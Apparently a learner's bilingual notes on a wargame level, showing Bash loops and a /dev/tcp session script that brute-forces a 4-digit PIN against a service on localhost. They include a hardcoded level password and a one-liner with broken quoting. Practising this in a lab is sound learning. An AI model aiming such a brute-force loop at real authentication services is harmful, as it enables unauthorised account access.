```
-eq : Equal (等于)
-ne : Not Equal (不等于)
-lt : Less Than (小于)
-le : Less or Equal (小于等于)
-gt : Greater Than (大于)
-ge : Greater or Equal (大于等于)
to compare two strings, use '==' or '!='
```

```
  while [ $i -lt 10000 ]; do
      # printf "%04d" formats the number to 4 digits (e.g., 5 becomes 0005)
      formatted_i=$(printf "%04d" $i)
      echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $formatted_i"
      i=$((i + 1))
  done | nc localhost 30002
```
or 

`for i in {0000..9999}; do "echo "psw" $i"; done | ncat localhost 30001`

or, in realWolrd, post 10000+ line to server, the connexion are gonna breaked instantly
we could rise a STATEFUL SESSION
```
/dev/tcp
# (建立连接，并把这个连接命名为通道 3)
exec 3<>/dev/tcp/localhost/30002

# (从通道 3 读取服务器的欢迎语)
read welcome_msg <&3
echo "Server said: $welcome_msg"

# (向通道 3 发送一次尝试)
echo "psw 1234" >&3

# 4. Read the server's feedback
read feedback <&3
echo "Server replied: $feedback"

# 5. Close the session when you are done
# (关闭连接)
exec 3>&-
#exec means to run a program and replace the shell
```

####the finale
```
#!/bin/bash

PASSWORD="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

# Open the session (Handshake)
exec 3<>/dev/tcp/localhost/30002

# Read the initial welcome message to clear the buffer
read welcome <&3

i=0
while [ $i -lt 10000 ]; do
    # Format the pin
    pin=$(printf "%04d" $i)
    
    # Send the attempt
    echo "$PASSWORD $pin" >&3
    
    # Read the response
    read response <&3
    
    # Check if the response does NOT contain the word "Wrong"
    if [[ "$response" != *"Wrong"* ]]; then
        echo "SUCCESS! The PIN is $pin"
        echo "Server said: $response"
        break # Stop the loop!
    fi
    
    i=$((i + 1))
#单括号是命令替换，比如$(ls)
#双括号是算数替换
done

# Close the session
exec 3>&-
```
```
exec 3<>/dev/tcp/... 的拆解：
3：我们自己挑一个空闲的编号（3 到 9 随便选）。
<>：意思是 Read and Write (读写双向模式)。如果是 > 就是只写，< 就是只读。
exec：在 Bash 里，exec 配合重定向符号使用时，它的作用是在当前 Shell 进程中永久打开这个文件描述符，而不是只给单条命令使用。
整体意思： 建立一个 TCP 连接，并把它绑定到通道 3 上，允许读写。
3>&- 的拆解：
3：指定通道 3。
>：重定向符号。
&-：这是 Bash 的特殊语法，代表 Close (关闭)。
整体意思： 释放/关闭通道 3。相当于 Python 里的 session.close()。
```
